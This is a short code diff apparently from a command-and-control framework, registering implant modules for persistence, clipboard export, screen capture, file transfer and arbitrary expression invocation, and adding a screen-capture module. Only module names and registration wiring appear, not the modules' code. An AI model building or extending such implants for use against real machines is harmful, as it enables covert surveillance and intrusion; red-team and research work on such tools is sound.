@@ -9,6 +9,7 @@ from Implant.implant_core.system_info import SystemInfo
 from Implant.implant_core.load_module import LoadModule
 from Implant.implant_core.invoke_expression import InvokeExpression
 from Implant.implant_core.get_loaded_modules import GetLoadedModules
+from Implant.implant_core.screen_capture import ScreenCapture
 
 from Data.Database import Database
 
@@ -19,13 +20,14 @@ class ImplantFunctionality:
         self.module_list = []
         self.module_list.append(DownloadFile())
         self.module_list.append(UploadFile())
-        self.module_list.append(PlayAudio())            # Early PoC
+        self.module_list.append(PlayAudio())            # Early PoC - Needs MemoryStream to remove locally saved files.
         self.module_list.append(EnablePersistence())
         self.module_list.append(ExportClipboard())
         self.module_list.append(SystemInfo())
         self.module_list.append(LoadModule())
         self.module_list.append(InvokeExpression())
         self.module_list.append(GetLoadedModules())
+        self.module_list.append(ScreenCapture())        # Beta
 
     def get_list_of_implant_text(self):
         implant_text = []
@@ -52,7 +54,7 @@ class ImplantFunctionality:
         # Takes a module type value, and the result and passes the raw result to the module process_implant_response
         db = Database()
         a = db.implant.get_registered_implant_commands_by_command_id(command_entry)
-        command_entry = ast.literal_eval(a['log_entry'])
+        command_entry = a['log_entry']
         host_data = None
         response_string = raw_command_result
 
